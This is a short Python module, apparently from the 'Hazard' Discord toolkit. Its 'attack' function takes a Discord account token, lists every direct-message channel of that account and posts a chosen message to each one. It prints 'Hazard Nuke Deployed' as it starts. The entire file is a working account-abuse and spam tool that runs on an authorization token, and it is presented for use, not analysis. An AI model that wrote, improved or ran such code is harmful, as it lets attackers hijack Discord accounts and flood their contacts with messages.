import threading
import requests
import Hazard
import random

from itertools import cycle
from colorama import Fore

from util.plugins.common import print_slow, setTitle, getheaders, proxy

def attack(token,message_Content):
    setTitle("Deploying Hazardous Nuke")
    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Hazard Nuke Deployed. . .")
    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    print_slow("\"ctrl + c\" at anytime to stop\n")
    for channel in channelIds:
        requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
        headers=headers,
        data={"content": f"{message_Content}"})
        setTitle(f"Messaging "+channel['id'])
        print(f"{Fore.RED}Messaged ID: {Fore.WHITE}"+channel['id']+Fore.RESET)


